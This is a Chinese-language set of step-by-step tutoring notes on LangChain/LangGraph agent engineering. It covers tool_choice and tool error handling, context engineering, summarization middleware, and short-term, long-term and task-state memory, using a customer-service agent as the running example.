2. **指定工具名写错**：`tool_choice="query_order"` 必须和 `@tool` 定义的名字完全一致，写错静默失败或报错。
3. **required 时工具列表不能为空**：会直接报错。
4. **跨 provider 取值不同**：OpenAI 用 `"required"`，Anthropic 用 `"any"`，指定工具的字典结构也不同。换模型要改。

#### 后端类比

不像路由参数，更像给模型的**操作权限开关**：
- `auto` = 全权委托（默认）
- `required` = 强制动手（不能拍脑袋瞎答）
- `none` = 只读模式（禁手，纯文本回答）

#### 生产场景

- **首轮 `required` 防幻觉**：业务查询类问题，第一轮强制模型必须调检索/查询工具再回答，**防止它不查就编**。这是万物云防幻觉的硬手段之一。
- **寒暄 `auto`/`none`**：用户说"你好"、"谢谢"，没必要调工具，`auto` 让模型直接回，省 token、省延迟。
- **万物云实际**：分类完成后，业务查询类问题首轮 `required` 调对应查询 Skill；闲聊类走 `auto`。

#### 工具失败处理（第10步提过，这步展开）

工具执行时可能失败（库查不到、超时、参数错、没权限）。失败时有两种处理方式：

**方式 A：抛异常**
```python
@tool
def search_order(order_id: str) -> str:
    db = connect_db()
    if not db:
        raise Exception("数据库连不上")  # ← 异常冒泡
    ...
```
后果：异常冒泡，**中断整个 agent 循环**，用户收到 500 错误（除非外层有兜底 try/except）。

**方式 B：返回错误信息（生产做法）**
```python
@tool
def search_order(order_id: str) -> str:
    try:
        db = connect_db()
        ...
    except Exception as e:
        return json.dumps({           # ← 不抛，返回错误信息
            "error": f"查询失败: {e}",
            "hint": "可稍后重试，或让用户提供更准确的订单号"
        })
```
后果：错误信息作为 ToolMessage 回给模型，模型**看到后自己决定下一步**（重试 / 换工具 / 问用户），循环不中断。

#### 后端类比（重点）

| Agent 工具 | Spring 后端 |
|---|---|
| 抛异常 -> 中断 agent 循环，用户收 500 | DAO 抛异常不接 -> 冒泡到用户，500 |
| 返回错误信息 -> 模型自己决定下一步 | DAO 抛异常被 Service catch -> Controller 返错误码 JSON，用户拿到友好提示 |

一句话：**工具内部 try/except 把异常转成错误信息返回，不让异常冒泡**--跟 Java DAO 抛异常、Controller 返错误码一个道理。

#### 万物云做法

所有工具函数都包了**统一 try/except 装饰器**（自己写的一个装饰器，套在所有 @tool 工具外面），失败统一返回：
```json
{"error": "具体错误", "hint": "建议下一步", "retryable": true}
```
- `error`：告诉模型出了什么错
- `hint`：建议模型下一步怎么办（重试 / 换工具 / 问用户）
- `retryable`：是否值得重试（数据库超时可重试，参数错不可重试）

模型看到这个结构就知道怎么处理，**绝大部分工具失败用户无感知**（模型自己重试或换路径解决了）。

#### 生产现实

- `tool_choice="required"` + `args_schema` 校验 = 防幻觉两道闸：一个防"不查就编"，一个防"编假参数"
- 工具失败**永远返回错误信息，不抛异常**--这是 agent 能稳定跑的前提
- `retryable` 字段很关键：没它模型会对不可重试的错误（如参数错）无限重试，配合第6步 recursion_limit 兜底

#### 第13步检查题

1. `tool_choice="required"` 在什么场景下用？为什么能防幻觉？
2. 工具执行失败时，**抛异常**和**返回错误信息**，区别是什么？万物云的统一错误返回结构里，`retryable` 字段是干嘛用的？

答出来再走第14步。

#### 第13步检查题答案（复盘）

1. **required 场景**（用户原答）：首轮使用，让模型去调工具查询防止乱来。
   - 标准：✓ 正确。业务查询类问题**首轮**用 required，强制模型必须调查询工具再回答，防"不查就编"（防幻觉硬手段）。（用户原话"让用户去调"是笔误，应为"让模型去调"。）

2. **区别 + retryable**（用户原答）：抛异常会中断 agent，返回错误信息让模型自己去判断后续怎么走。
   - 标准：**区别**✓ 简洁准确。**retryable 用户漏答**，补上：`retryable` = 是否值得重试。`true`（如数据库超时）模型可重试；`false`（如参数错）不可重试，模型该换路或问用户。没这字段，模型会对不可重试的错误（参数本来就错）无限重试，只能靠第6步 recursion_limit 兜底硬停。retryable 让模型"聪明地重试"而不是"无脑重试"。

---

### 第14步：Context Engineering 不是 Prompt Engineering

工具系统讲完了（第10-13步），进入**上下文工程**模块。这步先把概念立住。

#### Prompt Engineering vs Context Engineering

| | Prompt Engineering | Context Engineering |
|---|---|---|
| 管什么 | 调一句**静态 prompt** 的措辞 | 管模型每一轮看到的**全部上下文** |
| 时代 | 早期单轮调用（ChatGPT 刚出来） | Agent 多轮循环时代 |
| 内容 | 系统提示那一句话 | 系统提示 + 历史 messages + 工具定义 + 检索结果 + 长期记忆，**每轮都在变** |
| 类比 | 优化一个 SQL 的写法 | 管理整个事务里所有读写的数据 |

一句话：**Prompt Engineering 优化"一句话怎么说"，Context Engineering 管理"模型这一轮到底看到哪些东西"。**

#### 为什么 Agent 必须做 Context Engineering

Agent 是多轮循环（第1步），每轮循环通常往 messages 加 2 条（AIMessage + ToolMessage）。所以**每过一轮，模型看到的上下文都在膨胀**：

```
第1轮: [System, Human]                              ← 2条
第2轮: [System, Human, AI(tool_calls), Tool]        ← 4条
第3轮: [System, Human, AI, Tool, AI(tool_calls), Tool] ← 6条
...                                                  ← 一直涨
```

光优化第一句 System prompt 没用--真正决定模型回答质量的，是**这一轮它看到了哪些历史消息、哪些工具结果、哪些检索内容**。这些每轮都在变，必须主动管理。

#### 后端类比（重点）

- **Prompt Engineering** = 优化一个 API 的**请求体措辞**（一个请求）
- **Context Engineering** = 管理这个用户**整个会话**里所有请求 + 响应 + 缓存数据的集合（一次会话的全程数据流）

更像：Prompt = 一条 SQL；Context = 这个事务里所有读写的数据 + 会话级缓存 + 用户画像，全部要管起来。

#### 核心矛盾（这模块的主线）

上下文窗口**有限**（如 128k token），但 agent 多轮循环让上下文**不断膨胀**。不管就会：
1. **爆窗口**：超过模型上限，直接报错
2. **成本爆炸**：每轮把全部历史发给模型，token 费用线性涨
3. **质量下降**：上下文太长，模型"注意力分散"，关键信息被淹没（lost in the middle）

后面第15-16步讲怎么解决（裁剪 / 摘要 / 外移）。

#### 万物云现实

客服对话经常到 20+ 轮（用户问完订单问物流问退款）。不做上下文工程，早爆了。万物云客服 agent 的上下文管理是核心工程量之一。

#### 第14步检查题

1. Context Engineering 和 Prompt Engineering 的区别是什么？一句话讲清。
2. 为什么 Agent 场景**必须**做 Context Engineering，而不只是 Prompt Engineering？（提示：跟第1步的循环有什么关系？）

答出来再走第15步。

#### 第14步检查题答案（复盘）

1. **区别**（用户原答）：CE 包含整个会话累加信息、需要做策略；PE 只是某一步骤的提示词，设计整个 prompt 也是个工程。
   - 标准：✓ 核心抓对了--CE 管"整个会话的动态上下文"，PE 调"一句静态提示词"。补充层次关系：PE 是设计那句静态 prompt 的工程，CE 是管动态累加的全量上下文，**CE 包含 PE 那句 prompt 作为其中一部分**，两者层次不同。

2. **为什么必须**（用户原答）：上下文窗口有限，模型有 loss in middle 特性，数据量大影响效果和成本。
   - 标准：✓ 三个点全中（窗口有限 / loss in middle 质量 / 成本）。补跟循环的连接：单次调用上下文固定不用管，**正因为 Agent 是循环、每轮加 2 条让上下文不断膨胀**，才必须主动管。循环是 CE 从"可选"变"必须"的根因。

---

### 第15步：上下文由什么组成 + 工具定义也占 token

第14步说了 Context Engineering 管"模型每一轮看到的全量上下文"，这步拆开看**全量上下文到底有哪几部分**。

#### 模型每一轮实际看到的 5 部分

| # | 部分 | 内容 | 后端类比 |
|---|---|---|---|
| 1 | System prompt | 角色 + 规则 + 约束 | web.xml 全局配置 |
| 2 | 历史 messages | 对话历史（Human/AI/Tool 交替） | 会话日志 |
| 3 | **工具定义** | tools 的 JSON schema（名字+描述+参数schema） | API 网关每次带全量接口文档给调用方 |
| 4 | 检索结果 | RAG 检索回的外部知识 | 动态查的缓存数据 |
| 5 | 长期记忆 | Store 取回的用户画像等 | Redis 里的用户画像 |

**关键认知**：模型每轮看到的**不只是对话历史**，而是上面 5 项的**总和**。算 token 要全算进去，漏算任何一项都会低估。

#### 重点坑：工具定义也占 token（常被忽略）

每次调模型，**所有工具的名字 + 描述 + 参数 schema 都被转成 JSON 一起发过去**（第11步提过）。这不是只发一次--是**每一轮都发**。

```json
// 一个工具的定义大概长这样，发给模型：
{
  "name": "query_order",
  "description": "根据订单ID查询订单状态。当用户问订单/物流进度时用。",
  "parameters": {
    "type": "object",
    "properties": {
      "order_id": {"type": "string", "description": "订单编号，格式 ORD-YYYYMMDD-XXX"}
    },
    "required": ["order_id"]
  }
}
```

一个工具约 100-150 token。万物云 12 个 Skill ≈ 1500-2000 token，**每轮都发**。20 轮对话就是 20 × 2000 = 4 万 token 光花在工具定义上。

#### 后端类比（为什么是坑）

想象你写了个 REST API，但要求**每次调用都把全公司所有接口的 Swagger 文档带上**--哪怕这次只查订单。这就是工具定义占 token 的本质。后端不会这么干（接口文档只在网关查一次），但 LLM 调用每次都得带，因为模型是无状态的，**它每次都得重新"读"一遍工具清单才知道有哪些工具可用**。

#### 生产现实

- 工具定义是**常被低估的 token 大头**：开发者光盯着对话历史多长，忘了工具定义每轮固定占一大块
- 万物云 12 个 Skill + 长对话 + RAG 检索结果，上下文分分钟逼近窗口上限
- 这也是为什么第16步要讲"裁剪/摘要/外移"--工具定义这块也能优化（动态只发相关工具，不全发）

#### 第15步检查题

1. 模型每一轮看到的上下文，除了对话历史，还有哪几部分？（说出几个算几个）
2. 为什么说"工具定义也占 token"是个**容易被忽略**的坑？（提示：跟模型无状态、每轮都发有什么关系？）

答出来再走第16步。

#### 第15步检查题答案（复盘）

> 用户反馈"这一步没说清楚"，让我直接答。补透的根因是：**LLM 是无状态的纯函数**，这点之前没讲够。

1. **5 部分**（我答）：① System prompt（角色+规则）② 历史 messages（对话历史）③ 工具定义（tools 的 JSON schema：名字+描述+参数）④ 检索结果（RAG 外部知识）⑤ 长期记忆（Store 用户画像）。模型每轮看到的是这 5 项**总和**，算 token 全要算。

2. **为什么是坑**（我答）：根因是 **LLM 无状态**--`f(messages) -> response`，调用之间不记任何东西。后端类比：LLM 像 **stateless REST 服务**，每次请求都得把全部上下文塞进请求体，服务器不记得你上次带了什么。Agent 循环每轮调一次模型，每次独立，模型不"记得"上轮看过哪些工具，所以**必须每轮重发全部工具定义**。为什么容易被忽略：开发者后端直觉是"接口文档只注册一次不用每次带"，所以算 token 光盯对话历史，漏了工具定义这块**每轮固定开销**（12 个 Skill ≈ 2000 token，20 轮就 4 万 token）。

   一句话：**模型无状态 → 每轮必须重发全部上下文（含工具定义）→ 工具定义是每轮固定开销 → 最容易被漏算。**

---

### 第16步：上下文膨胀怎么办（裁剪 / 摘要 / 外移）+ 优先级

第14步立了"必须管"，第15步拆了"管什么"，这步讲"怎么管"。核心三种解法：

#### 三种解法

| 解法 | 做法 | 后端类比 | 缺点 |
|---|---|---|---|
| **裁剪 Trimming** | 直接删掉旧消息，只留最近 N 轮 | 日志只保留最近 N 条 / 缓存 LRU 淘汰 | 暴力，可能删关键信息 |
| **摘要 Summarization** | 用小模型把旧对话压成一段摘要，替换旧消息 | 日志滚动压缩归档（旧日志不删，压成摘要） | 有损，丢细节 |
| **外移 Offloading** | 把信息存外部（向量库/DB/Store），上下文只留指针，需要时检索回来 | 冷热分离（热数据 Redis，冷数据 DB，用时查） | 最复杂 |

#### 裁剪（最简单）

```python
# 暴力：只留最近 20 条
messages = messages[-20:]
# 或用 LangChain 的 trim_messages 工具，按 token 数裁
```
后端类比：LRU 缓存淘汰--超过容量就把最老的踢掉。

#### 摘要（保留信息省 token）

不直接删，而是调一个**小模型**把旧对话压成一段摘要，替换掉那一批旧消息：

```
旧消息（10条，2000 token）:
  Human: 我的订单 ORD-20260713-001 还没到
  AI: 帮您查到已发货...
  Human: 物流单号多少
  AI: SF1234567890
  ...

↓ 摘要压缩成 1 条（200 token）↓

System: [之前对话摘要] 用户在咨询订单 ORD-20260713-001 的物流，
        已发货，物流单号 SF1234567890，用户对时效有疑问。
```

**LangChain 自带 SummarizationMiddleware**（第6步讲 middleware 时提过的洋葱模型钩子，这就是一个现成的 middleware--对话超阈值自动触发摘要）。万物云就用这个：对话超过阈值，旧消息自动替换成摘要。

后端类比：日志滚动归档--旧日志不直接删，压成摘要归档，省空间又留线索。

#### 外移（最彻底）

把信息存到**外部存储**（向量库 / 数据库 / Store），上下文里只留一个引用，需要时再检索回来：

- **长期记忆**：用户画像存 Store，每轮按需检索注入（第17步讲记忆系统细讲）
- **检索结果**：RAG 检索回来的长文档，**用完即丢**，不长期留在上下文（下次需要再检索）--这就是外移思路

后端类比：冷热分离--热数据放 Redis，冷数据放 DB，用到再查。上下文是"热区"，外部存储是"冷区"。

#### 优先级（哪些留哪些删）

不是所有消息同等重要。裁剪/摘要时要按优先级：

| 优先级 | 内容 | 处理 |
|---|---|---|
| 最高 | System prompt | **永远留** |
| 高 | 最近 N 轮对话 | 留（用户当前关注） |
| 高 | 关键事实（订单号、日期） | 留，或外移到结构化记忆 |
| 中 | 工具结果 | 可能很长，可裁剪/外移（长文档只留摘要） |
| 低 | 旧寒暄 | 先删 |

后端类比：缓存淘汰策略--LRU 保最近，但**关键数据 pin 住不淘汰**（如 System prompt）。

#### 生产坑（重点）

1. **裁剪单独用会丢关键信息**：用户最早说的订单号被裁掉了，后面模型问"订单号是什么"--用户体验崩。所以裁剪**必须配合摘要或外移**：关键事实不能靠裁剪，要么压进摘要，要么外移到记忆。
2. **摘要丢细节**：有损压缩，细节会丢。所以**关键事实不要靠摘要**，要外移到结构化记忆（Store 里存 `order_id: ORD-xxx`，不是塞在自然语言摘要里）。
3. **摘要本身费 token**：每次摘要要调一次小模型。阈值要设好，不能每轮都摘要--万物云是超阈值才触发，不是每轮。

#### 万物云实际配方

每轮发给模型的 = **System prompt + 最近几轮 + 旧对话摘要**。检索结果用完即丢（外移）。关键事实外移到 Store 长期记忆。这是三种解法的组合，不是单用一种。

#### 第16步补充：SummarizationMiddleware 内部实现（面试会被追问）

面试官会追问"你为什么用它、看过它底层怎么实现吗"，这补透。

**触发条件：按 token，不按轮数**

参数 `max_tokens_before_summary`：messages 总 token 超过这个值才触发摘要。不是"多少轮压缩"，是"多少 token"。

为什么按 token 不按轮数：一轮可能 50 token（"好的"）也可能 5000 token（一个长工具结果），按轮数不精确，按 token 才准。这是面试能讲的设计点。

**内部 before_model 钩子做的事**（伪代码，讲清逻辑）：

```python
def before_model(self, state):
    messages = state["messages"]
    if count_tokens(messages) > self.max_tokens_before_summary:
        # 1. 分割：保留最近 messages_to_keep 条，其余（含上次的摘要消息）拿去重新摘
        keep = messages[-self.messages_to_keep:]
        old  = messages[:-self.messages_to_keep]   # old 里已含上次的摘要消息
        # 2. 重新摘成 1 条新摘要（替换掉 old 里所有内容，含旧摘要）
        new_summary = self.summary_model.invoke([
            SystemMessage("把以下内容压成一段摘要，保留关键事实..."),
            *old
        ])
        # 3. 替换：新摘要 + 保留的近期消息（始终只有 1 条摘要，不拼接不增长）
        state["messages"] = [new_summary] + keep
    return state
```

每轮调主模型前先跑这个钩子检查+压缩，主模型看到的就是压缩后的 messages（第6步洋葱模型的应用）。

**走一遍具体例子**（`max_tokens_before_summary=1000`, `messages_to_keep=4`）：

```
时刻1：对话到第6轮，token 超了
  messages = [S, m1, m2, m3, m4, m5, m6]   (m6 最新)
  keep最近4条 = [m3, m4, m5, m6]
  old        = [m1, m2]                      ← 原始消息，第一次被摘，全保真输入
  summary_1  = summarize(m1, m2)
  messages   = [S, summary_1, m3, m4, m5, m6]   ← 1条摘要 + 4条原始

时刻2：又聊几轮，token 又超了
  messages = [S, summary_1, m3, m4, m5, m6, m7, m8, m9, m10]
  keep最近4条 = [m7, m8, m9, m10]
  old        = [summary_1, m3, m4, m5, m6]   ← 旧摘要 + 这批原始消息
  summary_2  = summarize(summary_1, m3, m4, m5, m6)   ← 重新压成1条
  messages   = [S, summary_2, m7, m8, m9, m10]   ← 还是1条摘要 + 4条原始
```

关键：始终只有 1 条摘要（summary_2 替换 summary_1，不拼接、不增长）；m3~m6 在时刻2是第一次被摘（全保真输入），只有 m1、m2 过了两次摘要--新信息只摘一次，只有最老的尾巴多次摘。

**4 个关键设计点**（面试讲深的，逐条能答）：

1. **累积摘要（running summary）**：每次把【上次的摘要 + 这批新原始消息】一起喂给摘要模型，重新产出 **1 条新摘要**替换掉旧的。注意：**不是零失真**--最老的信息会经过多次摘要（不可避免，原始消息已丢）；但比"只摘上一次摘要"的 naive 做法（`summary_2 = summarize(summary_1)`，每轮所有信息都多过一次摘要，像复印件的复印件）失真更慢，因为新原始消息是第一次被摘、全保真输入，只有最老的尾巴多次摘。
2. **保留最近 N 条不摘要**（`messages_to_keep`）：近期对话是模型当前关注的，原样保留，只压缩"老的、暂时不活跃的"部分。
3. **用独立小模型做摘要**：主模型贵（gpt-4o），摘要用便宜的小模型（gpt-4o-mini）。摘要质量要求没主任务高，省成本。
4. **放在 before_model 钩子**：每轮主模型调用前压缩，主模型看到的就是压缩后的。middleware 洋葱模型的实际落地。

**为什么用它不自己写**（面试回答"为什么选它"）：
- **token 计数准**：不同模型 tokenizer 不同，自己算易错，框架处理了
- **累积摘要 + 保留策略 + 边界都封装好了**：如 ToolMessage 怎么摘、带 tool_calls 的 AIMessage 怎么处理，自己造轮子易踩坑
- **经过测试**：边角 case 已覆盖

**4 个生产坑**（看过底层才知道的）：

1. **阈值设太低** -> 频繁触发摘要，每轮都调小模型，成本反增 + 累积摘要失真快。万物云按窗口的约 60-70% 设，留余量。
2. **累积摘要久了丢早期关键事实** -> 订单号这类关键事实不能靠摘要，外移到 Store（第16步坑2 已讲）。
3. **ToolMessage 被摘要成自然语言丢结构** -> 工具返回的 JSON 被压成一句话，格式没了。重要工具结果外移，不靠摘要。
4. **摘要模型太弱** -> 摘要质量差，主模型基于烂摘要回答更差。摘要模型不能太便宜。

#### 第16步检查题

1. 上下文膨胀的三种解法各是什么？各自的后端类比？
2. 为什么**裁剪不能单独用**，必须配合摘要或外移？万物云每轮实际发给模型的是哪几部分？

答出来再走第17步（记忆系统模块）。

#### 第16步检查题答案（复盘）

1. **三种解法**（用户原答）：外移、摘要、裁剪。
   - 标准：✓ 三个全对（顺序无所谓，我的顺序是简单->复杂：裁剪最简单、外移最复杂）。

2. **裁剪不能单独用 + 万物云配方**（用户原答）：裁剪会丢历史数据；每轮发 system prompt + user query + summary + 最近几轮对话。
   - 标准：✓ 核心对。裁剪丢历史数据所以不能单独用。配方小补：① "user query" 就是"最近几轮"里最新的那条 HumanMessage，不用单列；② 严格说每轮还发**工具定义**（第15步，固定开销，bind_tools 单独绑，不在 summarization 管的 messages 里）。完整配方 = System prompt + 工具定义 + [summary + 最近几轮(含当前 query)]。

> 补充：`max_tokens_before_summary` 使用时自己填，没有通用默认值（合理值取决于主模型窗口大小，128k 和 32k 模型差很多）。`model`、`max_tokens_before_summary` 必传，`messages_to_keep` 一般也自己设。万物云按主模型窗口约 60-70% 设阈值。

---

### 第17步：短期记忆 = messages + checkpointer（= HttpSession）

进入**记忆系统**模块。记忆分三种，先看全貌知道"短期"是相对什么：

| 记忆类型 | 是什么 | 后端类比 | 哪步讲 |
|---|---|---|---|
| 短期记忆 | 这次会话的对话历史 | HttpSession（这次会话） | 本步 |
| 长期记忆 | 跨会话的用户偏好/画像 | 用户画像表/Redis（一直存） | 第18步 |
| 任务状态 | 这次任务的中间变量 | 工作流流程变量 | 第19步 |

本步讲短期记忆。

#### 先看没有记忆会怎样（为什么需要记忆）

Agent 每次调模型是**无状态**的（第15步讲过：`f(messages) -> response`，调用间不记东西）。那"用户上次聊到哪"这个信息哪来？答案就是记忆系统。

具体场景：用户在万物云客服问订单，隔天又回来。

**没有记忆系统：**
```
第一天：用户"我的订单 ORD-001 到哪了" -> agent 查 -> "已发货"
（服务重启部署）
第二天：用户"那物流单号多少" -> agent 一脸懵："什么订单？您说哪个？"
```
因为 agent 每次调用无状态，不记得昨天聊过啥。

#### 短期记忆两层 + 走一遍场景

**第一层：messages（这次会话的内存）**
- 用户这次来回对话的 messages 列表，存在进程内存
- 进程重启就没了

**第二层：checkpointer（持久化到外部存储）**
- 每次对话有变化，把 messages + state 存一份到外部（DB/Redis）
- 用 thread_id 关联（= sessionId）
- 下次用户回来，用同一 thread_id 拉回来恢复

**走一遍（接上面的场景，这次有记忆）：**
```
第一天：
  thread_id = "user_张三_session_1"
  用户："订单 ORD-001 到哪了"
  agent 查 -> "已发货"
  checkpointer 存：thread_id=1, messages=[H, AI], state={...}

（服务重启部署）

第二天：
  用户："那物流单号多少"
  系统用 thread_id="user_张三_session_1" 去 checkpointer 拉
  拉回 messages=[昨天的H, 昨天的AI]
  agent 看到历史 -> 知道在问 ORD-001 -> "物流单号 SF123"
```

关键：第一天和第二天之间进程重启了，但 checkpointer 把对话存到了外部，第二天能拉回来。这就是"跨运行恢复"。

> **ChatGPT 第二天打开同一个对话能继续，就是这个原理**：checkpointer 持久化 + 同一个 thread_id 恢复。注意"会话结束就清"是错误说法--进程内存的 messages 进程重启就没（但 checkpointer 有备份），checkpointer 里的数据要 TTL 过期/主动删才清。短期 vs 长期的真正区别是 **scope**（这个 thread vs 跨所有 thread），不是物理存活时间。

#### 短期记忆是什么

短期记忆 = **当前这个用户、这次会话**的记忆，不是跨用户的全局知识。两个层面：

| 层面 | 内容 | 生命周期 | 后端类比 |
|---|---|---|---|
| **messages（内存）** | 当前运行累积的对话历史 | 进程内，进程死了就没 | HttpSession 内存里的会话数据 |
| **checkpointer（持久化）** | 把 state（含 messages）存到外部 | 跨运行恢复，重启不丢 | session 持久化（存 Redis/DB，重启不丢） |

一句话：**messages 是这次跑的内存，checkpointer 让它跨运行存活。**

#### checkpointer 回顾（LangGraph 文档讲过，这里只指路）

checkpointer 的内部结构（thread_id + checkpoint 版本 + state 快照）在《LangGraph逐步辅导记录.md》讲过，这里不重复。你只要记住：
- 每个 thread（会话）一个 thread_id
- 每次状态变化存一个 checkpoint 版本
- 下次用同一个 thread_id 拉，能恢复到上次的 state（含全部 messages）

#### 后端类比（重点）

短期记忆整体 = **HttpSession**：
- **会话级**：属于"这个用户这次会话"，不是全局
- **用户级**：不同用户不同 session（不同 thread_id）
- messages（内存）= session 在内存的部分
- checkpointer = session 持久化（Tomcat 的 session 持久化到 Redis/文件，重启不丢，下次请求还能恢复）

跟 HttpSession 的区别：HttpSession 存任意 Java 对象，短期记忆的 messages 是**给 LLM 看的对话历史**（有结构：System/Human/AI/Tool 四类消息）。

#### 与上下文工程的关系（串起来）

短期记忆的 messages **是上下文工程管理的 5 部分中的一部分**（第2部分：历史 messages），不是全部：
- 第14步说"必须管上下文"--管的是 5 部分，messages 是其中第 2 部分
- 第15步说"上下文有 5 部分"--历史 messages 是其中第 2 部分
- 第16步"裁剪/摘要/外移"--作用在这个 messages 上

所以两者是**包含关系**：上下文工程管的范围更大（5 部分），短期记忆的 messages 是其中第 2 部分。短期记忆讲"这部分是什么、存哪、活多久"，上下文工程讲"全部 5 部分怎么管"。

#### 万物云现实

- 客服会话用 checkpointer 持久化：用户隔天回来，用同一个 thread_id 拉 checkpoint，**能接着上次的进度**（"您昨天问的订单 ORD-xxx，目前..."）
- checkpointer 后端：万物云的具体存储你**按真实的讲**（LangGraph 支持 PostgresSaver / RedisSaver / 自研），面试会追问表结构和存储格式，别瞎称 PostgresSaver 否则被表结构追问翻车

#### 第17步检查题

1. 短期记忆的两个层面是什么？各自的后端类比？
2. 短期记忆的 messages 和第14-16步的上下文工程是什么关系？

答出来再走第18步。

#### 第17步检查题答案（复盘）

1. **两层**（用户原答）：messages + checkpointer。
   - 标准：✓ 两个层面对了。补后端类比（用户漏答）：messages = HttpSession 内存里的会话数据；checkpointer = session 持久化到 Redis（重启不丢）；thread_id = JSESSIONID。

2. **与上下文工程关系**（用户原答）：messages 只是上下文工程里某一部分吧，有 human/system/toolmessage 等等。
   - 标准：**用户说得对，纠正了我之前一处不精确表述**。精确关系：上下文工程管 **5 部分**（第15步：System prompt / 历史 messages / 工具定义 / 检索结果 / 长期记忆），短期记忆的 messages 是其中**第 2 部分**（历史 messages），不是全部。我之前说"短期记忆的 messages 就是上下文工程管理的对象"不精确，应为"是其中一部分"。另外 messages 内部有 human/system/tool 等类型也对--这是第10步的四类消息（System/Human/AI/Tool），是 messages 的**内部结构**，跟"messages 占上下文几部分"是两个层面，别混。

> 已据此修正下文"与上下文工程的关系"小节的不精确表述。

---

### 第18步：长期记忆 = Store + 主动检索注入（= Redis 用户画像）

短期记忆是"这次会话的"，长期记忆是"跨会话一直存的"。

#### 长期记忆是什么

长期记忆 = 跨会话的用户信息：偏好、画像、历史汇总。**会话结束了还在**，下次会话能取出来用。

例子：
- 用户是 VIP，优先处理
- 用户常用收货地址：深圳市南山区 xxx
- 用户偏好：催单时先查物流再回复
- 历史汇总：过去 3 个月咨询过 5 次退款

#### 实现：Store + 主动检索注入

**Store**：LangChain 的 KV 存储（BaseStore），跨会话持久化。按 namespace + key 存，比如 `("user", "张三") -> {vip: true, address: "..."}`。

后端类比：Store = **用户画像表 / Redis**（跨会话一直存，按 userId 查）。

**主动检索注入**（关键）：长期记忆**不是自动放进上下文**的。而是每轮（或特定时机）根据当前对话，**主动去 Store 检索**相关的长期记忆，注入到这轮的上下文里。

```python
# 伪代码：每轮调模型前，检索长期记忆注入
def before_model(state):
    user_id = state["user_id"]
    profile = store.get(("user", user_id))   # 主动检索这个用户的长期记忆
    # 注入到上下文（作为 system 的一部分）
    state["messages"].insert(0, SystemMessage(f"用户画像：{profile}"))
    return state
```

这其实就是一个 **before_model middleware**（第6步讲过 middleware 钩子）--万物云的 ContextInjectionMiddleware 干的就是这事。

#### 为什么不自动放进上下文

- **省 token**：长期记忆可能很大（全量用户画像），全塞进上下文每轮都发，爆窗口。主动检索只取**这次相关的**。
- **按需**：用户问订单时注入订单相关画像，问售后时注入售后历史，不一股脑全塞。

后端类比：用户画像表存全量，但每次请求**只查需要的字段**，不是把整张表读出来。一样的道理。

#### 与短期记忆区别

| | 短期记忆 | 长期记忆 |
|---|---|---|
| 范围 | 这次会话 | 跨会话 |
| 内容 | 对话历史 messages | 用户画像/偏好/历史汇总 |
| 生命周期 | scope=这次会话（checkpointer 可跨天恢复同 thread，换会话不带） | 跨所有会话一直存 |
| 后端类比 | HttpSession | 用户画像表/Redis |
| 怎么进上下文 | 就是 messages 本身 | 主动检索注入 |

#### 与第16步"外移"的关系

长期记忆就是第16步"外移"出去的**冷数据**：关键事实（用户画像、偏好）外移到 Store 存着，上下文里只留引用，需要时检索回来注入。所以长期记忆 = 外移的落地实现。

#### 万物云现实

- 用户 VIP 等级、常用地址、历史咨询汇总存 Store
- 对话时 ContextInjectionMiddleware 主动检索注入："该用户是 VIP，优先处理"
- 跟短期记忆（checkpointer 存对话历史）是两套存储，各管各的

#### 第18步检查题

1. 长期记忆和短期记忆的区别是什么？后端类比各是什么？
2. "主动检索注入"是什么意思？为什么不自动把长期记忆全放进上下文？

答出来再走第19步。

#### 第18步检查题答案（复盘）

1. **长期 vs 短期**（用户原答）：长期记忆是记录用户长期需要的东西、全会话使用；短期记忆是当前会话的上下文，不确定求润色。
   - 标准（润色后）：长期记忆 = 跨会话的用户信息（偏好/画像/汇总），存 Store（万物云 pgvector），会话结束还在，跨所有会话使用；短期记忆 = 当前这次会话的对话历史（messages），存内存+checkpointer，scope=这次会话（同 thread 可跨天恢复，换会话不带）。区别：长期跨所有会话一直存（=用户画像表），短期 scope=这次会话（=HttpSession）。⚠️ 小修正：短期记忆的 messages 是"当前会话的**对话历史**"，是上下文 5 部分中的第 2 部分，不是"整个上下文"。

2. **主动检索触发**（用户原答）：自定义某些规则触发去查库加载；自动每次都加载会影响会话质量，涉及上下文工程。
   - 标准：✓ 抓对了核心。补全：① 触发时机 = 每轮调模型前，由 `before_model` middleware 钩子触发（自定义逻辑 + 框架触发时机）；② 怎么触发 = middleware 用 user_id `store.get()` 查，拼 SystemMessage 注入；③ 不全量自动加载 = 全量画像每轮全塞会爆窗口（上下文膨胀）+ 模型注意力分散影响质量（lost in the middle），按需检索只取相关的。用户"涉及上下文工程"的连接完全对--主动检索 = 第16步"外移+按需注入"的落地。

> 补充澄清：Store 是 KV 存储（接口像 Redis，不是关系型 MySQL），value 常是 dict 序列化成 JSON（所以"感觉存 JSON"）。万物云 pgvector = Postgres+向量扩展，数据存 Postgres 但当 KV 用，额外支持向量语义检索（相似合并）。

---

### 第19步：任务状态 = State 自定义字段（= 工作流流程变量）

记忆三种讲完两种（短期第17、长期第18），这是第三种：**任务状态**。

#### 任务状态是什么

任务状态 = **这次任务的中间变量/进度状态**，存在 LangGraph State 的**自定义字段**里。不是对话历史（那是短期记忆），不是跨会话画像（那是长期记忆），是"这次任务跑到哪一步、中间结果是什么"。

例子（万物云客服处理退款）：
```python
class CustomerServiceState(TypedDict):
    messages: Annotated[list, add_messages]   # 短期记忆（对话历史）
    user_id: str
    # ↓ 这些是任务状态（自定义字段）
    intent: str              # 分类结果："退款"
    risk_level: str          # 风控结果："低"
    current_step: str        # 当前步骤："已查订单，待审核"
    refund_amount: float     # 退款金额：100
    order_info: dict         # 查到的订单信息
```

`intent` / `risk_level` / `current_step` / `refund_amount` 这些就是任务状态--结构化的业务进度。

#### 后端类比（重点）

任务状态 = **工作流流程变量**（Activiti / Spring 流程变量 / Camunda）：
- Activiti 流程里 `execution.setVariable("risk_level", "低")` = LangGraph State 里 `state["risk_level"] = "低"`
- 流程变量跟着流程实例走，流程结束就清 = 任务状态跟着这次任务走，任务结束就清
- 给流程/代码看的（控制流转），不是给模型看的对话

#### 跟短期记忆、长期记忆的区别

| | 短期记忆 | 长期记忆 | 任务状态 |
|---|---|---|---|
| 是什么 | 对话历史 messages | 用户画像/偏好 | 任务中间变量/进度 |
| 存哪 | 内存 + checkpointer | Store（pgvector） | State 自定义字段 |
| 给谁看 | 给模型看 | 给模型看（注入后） | 给流程/代码看（控制流转） |
| 作用域 | 这次会话（checkpointer 可跨天恢复，换会话不带） | 跨所有会话 | 这次任务 |
